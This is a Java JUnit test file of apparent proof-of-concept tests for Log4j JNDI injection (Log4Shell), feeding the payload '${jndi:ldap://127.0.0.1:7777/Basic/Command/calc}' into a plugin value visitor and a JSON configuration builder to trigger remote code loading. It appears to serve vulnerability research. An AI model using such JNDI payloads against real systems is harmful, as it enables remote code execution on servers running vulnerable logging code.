import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.*;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
import org.apache.logging.log4j.core.config.builder.impl.DefaultConfigurationBuilder;
import org.apache.logging.log4j.core.config.composite.CompositeConfiguration;
import org.apache.logging.log4j.core.config.plugins.PluginValue;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginValueVisitor;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginVisitor;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.lang.annotation.Annotation;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class PluginPocsTests {

    @Test
    public void PluginValueVisitor() {
        Configuration configuration = new DefaultConfiguration();

        Node node = new Node();
        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");

        PluginVisitor visitor = new PluginValueVisitor();
        visitor.setStrSubstitutor(configuration.getStrSubstitutor());


        PluginValue annotation = new PluginValue(){

            @Override
            public Class<? extends Annotation> annotationType() {
                return this.getClass();
            }

            @Override
            public String value() {
                return "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}";
            }
        };
        LogEvent logEvent = new MutableLogEvent(new StringBuilder(), null);
        visitor.setAnnotation(annotation);

        visitor.visit(configuration, node, logEvent, new StringBuilder());
    }

    @Test
    public void buildDefaultConfigurationBuilderTest() throws IOException {
        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        DefaultConfigurationBuilder builder = new DefaultConfigurationBuilder<>();
        builder.setConfigurationSource(source);
        builder.build();
    }

}
